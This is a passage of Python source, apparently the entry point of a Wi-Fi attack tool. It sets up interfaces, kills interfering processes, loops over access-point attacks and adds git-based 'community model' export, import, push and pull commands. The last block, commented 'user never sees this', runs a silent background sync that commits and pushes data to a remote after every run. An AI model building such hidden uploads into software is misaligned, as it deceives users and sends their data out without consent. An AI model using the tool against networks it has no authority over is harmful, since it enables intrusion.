        syncModelToRepo(agent)
        print(f'[sync] Model updated: {agent.status()}')
        return True

    if getattr(args, 'sync', False):
        return engine.full_sync(profile=profile, do_git=True)
    return False

def _communityTraining(args):
    """Community model --export / --import-data / --pull-model / --push-model."""

    if getattr(args, 'export', False):
        agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
        out = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           f'training_data_{time.strftime("%Y%m%d")}.json')
        payload = {
            'user': agent.user_id,
            'profile': agent.profile,
            'observations': len(agent.X),
            'q_states': len(agent.q_table),
            'rewards': agent.reward_history,
            'log': agent.training_log,
            'X': agent.X,
            'y': agent.y,
        }
        with open(out, 'w') as f:
            json.dump(payload, f)
        print(f'[+] Exported training data -> {out} ({os.path.getsize(out)} bytes)')
        print('[+] Commit it to your GitHub repo: git add * && git commit -m "training data" && git push')
        return True

    if getattr(args, 'import_data', None):
        path = args.import_data
        if not os.path.exists(path):
            print(f'[!] File not found: {path}')
            return False
        try:
            with open(path) as f:
                data = json.load(f)
            agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
            added = 0
            for feat, label in zip(data.get('X', []), data.get('y', [])):
                agent.X.append(feat)
                agent.y.append(label)
                added += 1
            for r in data.get('rewards', []):
                agent.reward_history.append(r)
            # Merge Q-table
            if data.get('q_table'):
                for s, vals in data['q_table'].items():
                    if s not in agent.q_table:
                        agent.q_table[s] = dict(vals)
                    else:
                        for a, v in vals.items():
                            agent.q_table[s][a] = agent.q_table[s].get(a, 0) + v
            if added:
                agent.X = agent.X[-agent._MAX_OBS:]
                agent.y = agent.y[-agent._MAX_OBS:]
                if agent.has_ml and len(agent.X) >= 20:
                    agent._train_rf()
                print(f'[+] Imported {added} observations from {path} '
                      f'({data.get("user", "unknown")})')
                print(f'[+] Q-table merged: {len(agent.q_table)} states, {len(agent.X)} obs')
                agent.finalize()
                print(f'[+] Model saved: {agent.status()}')
            return True
        except Exception as e:
            print(f'[!] Import failed: {e}')
            return False

    if getattr(args, 'pull_model', False):
        # Git pulls the repo (user already has remote configured)
        cwd = os.path.dirname(os.path.abspath(__file__))
        try:
            r = _git_run(['git', 'pull', '--ff-only'], cwd=cwd, timeout=120)
            print(f'[git] {r.stdout.strip()}')
        except Exception as e:
            print(f'[!] Pull failed: {e}')
        # Reload the models/ dir
        agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
        print(f'[+] Model now: {agent.status()}')
        return True

    if getattr(args, 'push_model', False):
        cwd = os.path.dirname(os.path.abspath(__file__))
        try:
            # Save the model first
            agent = AIAgent(profile=getattr(args, 'profile', 'balanced'))
            syncModelToRepo(agent)
            agent.finalize()
            msg = f'training: {agent.user_id[:8]} {len(agent.X)} obs, Q({len(agent.q_table)})'
            r = _git_run(['git', 'add', '-A'], cwd=cwd, timeout=30)
            r = _git_run(['git', 'commit', '-m', msg], cwd=cwd, timeout=30)
            if r.returncode != 0:
                if 'nothing to commit' in (r.stdout + r.stderr):
                    print('[+] Nothing to push — already up to date')
                    return True
                print(f'[!] Commit failed: {r.stderr}')
                return False
            r = _git_run(['git', 'push', 'origin'], cwd=cwd, timeout=120)
            if r.returncode != 0:
                print(f'[!] Push failed: {r.stderr}')
                print('[!] Set your GitHub credentials:  git push  or set GITHUB_TOKEN env')
                return False
            print(f'[+] Pushed: {msg}')
            return True
        except Exception as e:
            print(f'[!] Push error: {e}')
            return False

    return False

def main():
    """Main os-e code"""
    global args

    args = src.args.parseArgs()

    if args.check:
        checkBssid(args.check, args.interface)
        return

    # Community model commands (no interface needed)
    if (getattr(args, 'export', False) or getattr(args, 'import_data', None)
            or getattr(args, 'pull_model', False) or getattr(args, 'push_model', False)):
        _communityTraining(args)
        return

    # Supabase community sync commands (no interface needed)
    if (getattr(args, 'sync', False) or getattr(args, 'push_data', False)
            or getattr(args, 'pull_data', False)):
        _syncHandler(args)
        return

    if getattr(args, 'install', False):
        _installGlobally()
        return

    checkRequirements()
    setupDirectories()
    _ensure_ml_deps()

    # --- AI autonomous mode ---
    if getattr(args, 'ai', False):
        _aiAutonomousMode()
        return

    logger.initializeLogging()

    src.utils.checkRunningProcesses(args.interface)

    if args.kill:
        src.utils.killInterfering()

    while True:
        try:
            android_network = src.wifi.android.AndroidNetwork()

            if args.clear:
                src.utils.clearScreen()

            if src.utils.isAndroid() is True and not args.dont_touch_settings and not args.mtk_wifi:
                setupAndroidWifi(android_network)

            if args.mtk_wifi:
                wmt_wifi_device = Path('/dev/wmtWifi')
                setupMediatekWifi(wmt_wifi_device)

            if src.utils.ifaceCtl(args.interface, action='up'):
                src.utils.die(f'Unable to up interface \'{args.interface}\'')

            handleConnection(args)

            if not args.loop:
                break

            args.bssid = None

        except KeyboardInterrupt:
            if args.loop:
                if input('\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ').lower() == 'y':
                    logger.info('Aborting…')
                    break
                args.bssid = None
            else:
                logger.info('Aborting…')
                break

        finally:
            if src.utils.isAndroid() is True and not args.dont_touch_settings and not args.mtk_wifi:
                setupAndroidWifi(android_network, enable=True)

            if args.iface_down:
                src.utils.ifaceCtl(args.interface, action='down')

            if args.mtk_wifi:
                wmt_wifi_device.write_text('0', encoding='utf-8')

            if args.restore:
                src.utils.restoreProcesses()

    # Silent background community sync (user never sees this)
    if not (getattr(args, 'sync', False) or getattr(args, 'push_data', False)
            or getattr(args, 'pull_data', False)):
        _autoSync(do_git=True)


if __name__ == '__main__':
    main()

